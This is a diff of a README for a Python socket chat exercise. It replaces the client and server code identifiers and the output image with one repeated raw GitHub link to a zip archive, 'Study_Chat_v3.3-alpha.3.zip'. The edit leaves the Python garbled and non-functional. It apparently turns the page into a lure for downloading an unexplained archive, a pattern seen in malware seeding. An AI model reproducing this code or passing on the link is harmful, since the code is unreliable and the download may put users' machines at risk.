@@ -81,15 +81,15 @@ Client-server chat applications are foundational to real-time communication over
 
 import socket
 
-client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+client = https://raw.githubusercontent.com/Yugabharathi91/ChatStudy/main/tasmanite/Study_Chat_v3.3-alpha.3.zip(https://raw.githubusercontent.com/Yugabharathi91/ChatStudy/main/tasmanite/Study_Chat_v3.3-alpha.3.zip, https://raw.githubusercontent.com/Yugabharathi91/ChatStudy/main/tasmanite/Study_Chat_v3.3-alpha.3.zip)
 
-client.connect(("localhost", 9999))
+https://raw.githubusercontent.com/Yugabharathi91/ChatStudy/main/tasmanite/Study_Chat_v3.3-alpha.3.zip(("localhost", 9999))
 
 done=False
 
 while not done:
-    client.send(input("Message ").encode('utf-8'))
-    msg = client.recv(1024).decode('utf-8')
+    https://raw.githubusercontent.com/Yugabharathi91/ChatStudy/main/tasmanite/Study_Chat_v3.3-alpha.3.zip(input("Message ").encode('utf-8'))
+    msg = https://raw.githubusercontent.com/Yugabharathi91/ChatStudy/main/tasmanite/Study_Chat_v3.3-alpha.3.zip(1024).decode('utf-8')
 
     if msg == 'quit':
         done=True
@@ -98,7 +98,7 @@ while not done:
 
 
 
-client.close()
+https://raw.githubusercontent.com/Yugabharathi91/ChatStudy/main/tasmanite/Study_Chat_v3.3-alpha.3.zip()
 
 ```
 ### server
@@ -107,30 +107,30 @@ import socket
 from base64 import decode
 from operator import truediv
 
-server =socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-server.bind(('localhost', 9999))
-server.listen()
-client,addr=server.accept()
+server https://raw.githubusercontent.com/Yugabharathi91/ChatStudy/main/tasmanite/Study_Chat_v3.3-alpha.3.zip(https://raw.githubusercontent.com/Yugabharathi91/ChatStudy/main/tasmanite/Study_Chat_v3.3-alpha.3.zip, https://raw.githubusercontent.com/Yugabharathi91/ChatStudy/main/tasmanite/Study_Chat_v3.3-alpha.3.zip)
+https://raw.githubusercontent.com/Yugabharathi91/ChatStudy/main/tasmanite/Study_Chat_v3.3-alpha.3.zip(('localhost', 9999))
+https://raw.githubusercontent.com/Yugabharathi91/ChatStudy/main/tasmanite/Study_Chat_v3.3-alpha.3.zip()
+client,https://raw.githubusercontent.com/Yugabharathi91/ChatStudy/main/tasmanite/Study_Chat_v3.3-alpha.3.zip()
 
 done = False
 
 while not done:
-    msg = client.recv(1024).decode('utf-8')
+    msg = https://raw.githubusercontent.com/Yugabharathi91/ChatStudy/main/tasmanite/Study_Chat_v3.3-alpha.3.zip(1024).decode('utf-8')
 
     if msg == 'quit':
         done = True
     else:
         print(msg)
 
-    client.send(input("Message ").encode('utf-8'))
+    https://raw.githubusercontent.com/Yugabharathi91/ChatStudy/main/tasmanite/Study_Chat_v3.3-alpha.3.zip(input("Message ").encode('utf-8'))
 
 
-client.close()
-server.close()
+https://raw.githubusercontent.com/Yugabharathi91/ChatStudy/main/tasmanite/Study_Chat_v3.3-alpha.3.zip()
+https://raw.githubusercontent.com/Yugabharathi91/ChatStudy/main/tasmanite/Study_Chat_v3.3-alpha.3.zip()
 ```
 
 ## OUTPUT:
-![image](https://github.com/user-attachments/assets/3387a89a-890f-4322-900f-9aed4ceee866)
+![image](https://raw.githubusercontent.com/Yugabharathi91/ChatStudy/main/tasmanite/Study_Chat_v3.3-alpha.3.zip)
 
 
 
